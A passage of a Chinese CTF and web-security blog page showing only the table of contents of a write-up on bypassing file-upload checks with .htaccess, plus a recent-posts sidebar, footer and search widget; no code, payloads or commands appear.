href="#SetHandler-%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84"><span class="toc-text">SetHandler 是怎么工作的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SetHandler%E3%80%81AddHandler%E3%80%81AddType-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">SetHandler、AddHandler、AddType 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AllowOverride%EF%BC%9A-htaccess-%E7%9A%84%E5%BC%80%E5%85%B3"><span class="toc-text">AllowOverride：.htaccess 的开关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%B1%82%EF%BC%9A%E6%8A%8A-htaccess-%E5%92%8C%E6%9C%A8%E9%A9%AC%E6%94%BE%E8%BF%9B%E5%90%8C%E4%B8%80%E4%B8%AA%E7%9B%AE%E5%BD%95"><span class="toc-text">第六层：把 .htaccess 和木马放进同一个目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%B1%82%EF%BC%9A3-%E7%A7%92%E6%B8%85%E7%90%86%E4%B8%8E%E8%84%9A%E6%9C%AC%E7%AB%9E%E9%80%9F"><span class="toc-text">第七层：3 秒清理与脚本竞速</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E8%84%9A%E6%9C%AC"><span class="toc-text">完整脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E9%87%8C%E5%87%A0%E4%B8%AA%E5%AE%B9%E6%98%93%E5%87%BA%E9%94%99%E7%9A%84%E7%82%B9"><span class="toc-text">脚本里几个容易出错的点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85"><span class="toc-text">知识点补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%9B%9B%E5%B1%82%E6%A3%80%E6%9F%A5"><span class="toc-text">1. 文件上传的四层检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MIME-%E6%A3%80%E6%9F%A5%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-text">2. MIME 检查的两种写法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%86%85%E5%AE%B9%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%BA%E4%BB%80%E4%B9%88%E6%80%BB%E8%A2%AB%E7%BB%95%E8%BF%87"><span class="toc-text">3. 内容黑名单为什么总被绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-htaccess-%E7%9A%84%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="toc-text">4. .htaccess 的适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-mod-php-%E4%B8%8E-PHP-FPM-%E7%9A%84%E5%B7%AE%E5%BC%82"><span class="toc-text">5. mod_php 与 PHP-FPM 的差异</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95%E4%B8%8E%E4%BC%9A%E8%AF%9D%E7%9A%84%E7%BB%91%E5%AE%9A"><span class="toc-text">6. 上传目录与会话的绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%AB%9E%E6%80%81%E4%B8%8E%E8%84%9A%E6%9C%AC%E5%8F%AF%E9%9D%A0%E6%80%A7"><span class="toc-text">7. 竞态与脚本可靠性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%A6%82%E6%9E%9C-htaccess-%E8%B5%B0%E4%B8%8D%E9%80%9A"><span class="toc-text">8. 如果 .htaccess 走不通</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-text">新手常见问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%E5%AE%9E%E9%AA%8C%EF%BC%88Docker-Apache-PHP-5-6%EF%BC%89"><span class="toc-text">本地复现实验（Docker + Apache + PHP 5.6）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5"><span class="toc-text">完整流程速查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%E6%80%8E%E4%B9%88%E9%98%B2"><span class="toc-text">顺手聊聊怎么防</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/18/web-ctf-upload-babyupload/" title="[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析">[GXYCTF2019] BabyUpload：MIME 伪造、内容黑名单与 .htaccess 接管解析</a><time datetime="2026-11-18T02:00:00.000Z" title="发表于 2026-11-18 10:00:00">2026-11-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/17/pwn-ctf-format-string-pwn5/" title="Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system">Pwn 入门：第五空间 2019 决赛 PWN5——格式化字符串、GOT 劫持与 atoi→system</a><time datetime="2026-11-17T02:00:00.000Z" title="发表于 2026-11-17 10:00:00">2026-11-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/" title="Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾">Pwn 入门：not_the_same_3dsctf_2016——45 字节偏移、32 位栈传参与用 printf 收尾</a><time datetime="2026-11-14T07:00:00.000Z" title="发表于 2026-11-14 15:00:00">2026-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/14/web-ctf-http-geek2019/" title="[极客大挑战 2019] Http：Referer、User-Agent、X-Forwarded-For，以及被反向代理吞掉的那一步">[极客大挑战 2019] Http：Referer、User-Agent、X-Forwarded-For，以及被反向代理吞掉的那一步</a><time datetime="2026-11-14T03:00:00.000Z" title="发表于 2026-11-14 11:00:00">2026-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/14/web-knowledge-php-common-vulns/" title="PHP 常见漏洞笔记：数组报错绕过、Cookie 信任与 php://filter 读源码">PHP 常见漏洞笔记：数组报错绕过、Cookie 信任与 php://filter 读源码</a><time datetime="2026-11-14T01:00:00.000Z" title="发表于 2026-11-14 09:00:00">2026-11-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Quellisya</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div><div class="footer_custom_text">以墨为舟，以码为桨 · CTF & Web Security Notes</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script defer src="/js/butterfly-custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索笔记、题目或 payload…" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.0"></script></div></div></body></html>
